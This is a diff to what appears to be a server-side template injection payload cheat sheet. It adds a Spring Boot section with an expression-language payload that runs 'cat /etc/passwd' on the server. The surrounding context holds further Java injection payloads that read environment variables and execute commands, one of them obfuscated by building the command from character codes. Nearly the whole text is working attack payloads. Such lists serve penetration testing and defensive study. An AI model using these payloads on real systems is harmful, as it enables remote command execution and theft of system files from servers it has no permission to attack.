@@ -33,6 +33,7 @@
     - [Java - Basic injection](#java---basic-injection)
     - [Java - Retrieve the system’s environment variables](#java---retrieve-the-systems-environment-variables)
     - [Java - Retrieve /etc/passwd](#java---retrieve-etcpasswd)
+  - [Spring Boot](#spring-boot)
   - [Django Templates](#django-templates)
   - [Python - Jinja2](#jinja2)
     - [Jinja2 - Basic injection](#jinja2---basic-injection)
@@ -351,6 +352,16 @@ ${T(java.lang.System).getenv()}
 ${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
 
 ${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
+```
+
+---
+
+## Spring Boot
+> Spring Boot is a Java-based web framework.
+
+### Spring Boot - Retrieve /etc/passwd
+```java
+*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd').getInputStream())}
 ```
 
 ---
